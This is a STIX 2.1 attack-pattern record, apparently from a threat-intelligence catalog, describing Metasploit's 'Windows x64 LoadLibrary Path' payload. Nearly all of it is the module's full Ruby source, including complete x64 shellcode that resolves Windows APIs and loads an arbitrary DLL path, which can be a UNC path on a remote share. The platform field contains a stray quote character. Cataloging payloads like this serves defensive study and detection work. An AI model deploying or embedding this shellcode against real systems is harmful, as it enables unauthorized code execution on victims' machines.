{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21b6019d-25c0-4500-9852-445a06ec7376",
    "created": "2024-08-14T16:33:19.3851Z",
    "modified": "2024-08-14T16:33:19.385104Z",
    "name": "Windows x64 LoadLibrary Path",
    "description": "Load an arbitrary x64 library path",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/x64/loadlibrary.rb",
            "external_id": "loadlibrary.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 285\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Windows x64 LoadLibrary Path',\n      'Description'   => 'Load an arbitrary x64 library path',\n      'Author'        => [ 'scriptjunkie', 'sf' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X64,\n      'PayloadCompat' =>\n        {\n          'Convention' => '-http -https',\n        },\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'EXITFUNC' => [ 227, 'V' ]\n            },\n          'Payload' =>\n            \"\\xFC\\x48\\x83\\xE4\\xF0\\xE8\\xC8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\" +\n            \"\\x56\\x48\\x31\\xD2\\x65\\x48\\x8B\\x52\\x60\\x48\\x8B\\x52\\x18\\x48\\x8B\\x52\" +\n            \"\\x20\\x48\\x8B\\x72\\x50\\x48\\x0F\\xB7\\x4A\\x4A\\x4D\\x31\\xC9\\x48\\x31\\xC0\" +\n            \"\\xAC\\x3C\\x61\\x7C\\x02\\x2C\\x20\\x41\\xC1\\xC9\\x0D\\x41\\x01\\xC1\\xE2\\xED\" +\n            \"\\x52\\x41\\x51\\x48\\x8B\\x52\\x20\\x8B\\x42\\x3C\\x48\\x01\\xD0\\x66\\x81\\x78\" +\n            \"\\x18\\x0B\\x02\\x75\\x72\\x8B\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xC0\\x74\\x67\" +\n            \"\\x48\\x01\\xD0\\x50\\x8B\\x48\\x18\\x44\\x8B\\x40\\x20\\x49\\x01\\xD0\\xE3\\x56\" +\n            \"\\x48\\xFF\\xC9\\x41\\x8B\\x34\\x88\\x48\\x01\\xD6\\x4D\\x31\\xC9\\x48\\x31\\xC0\" +\n            \"\\xAC\\x41\\xC1\\xC9\\x0D\\x41\\x01\\xC1\\x38\\xE0\\x75\\xF1\\x4C\\x03\\x4C\\x24\" +\n            \"\\x08\\x45\\x39\\xD1\\x75\\xD8\\x58\\x44\\x8B\\x40\\x24\\x49\\x01\\xD0\\x66\\x41\" +\n            \"\\x8B\\x0C\\x48\\x44\\x8B\\x40\\x1C\\x49\\x01\\xD0\\x41\\x8B\\x04\\x88\\x48\\x01\" +\n            \"\\xD0\\x41\\x58\\x41\\x58\\x5E\\x59\\x5A\\x41\\x58\\x41\\x59\\x41\\x5A\\x48\\x83\" +\n            \"\\xEC\\x20\\x41\\x52\\xFF\\xE0\\x58\\x41\\x59\\x5A\\x48\\x8B\\x12\\xE9\\x4F\\xFF\" +\n            \"\\xFF\\xFF\\x5D\\x48\\x8D\\x8D\\xFF\\x00\\x00\\x00\\x41\\xBA\\x4C\\x77\\x26\\x07\" +\n            \"\\xFF\\xD5\\xBB\\xE0\\x1D\\x2A\\x0A\\x41\\xBA\\xA6\\x95\\xBD\\x9D\\xFF\\xD5\\x48\" +\n            \"\\x83\\xC4\\x28\\x3C\\x06\\x7C\\x0A\\x80\\xFB\\xE0\\x75\\x05\\xBB\\x47\\x13\\x72\" +\n            \"\\x6F\\x6A\\x00\\x59\\x41\\x89\\xDA\\xFF\\xD5\"\n        }\n      ))\n    register_options(\n      [\n        OptString.new('DLL', [ true, \"The library path to load (UNC is OK)\" ]),\n      ])\n  end\n\n  def generate\n    return super + dll_string + \"\\x00\"\n  end\n\n  def dll_string\n    return datastore['DLL'] || ''\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}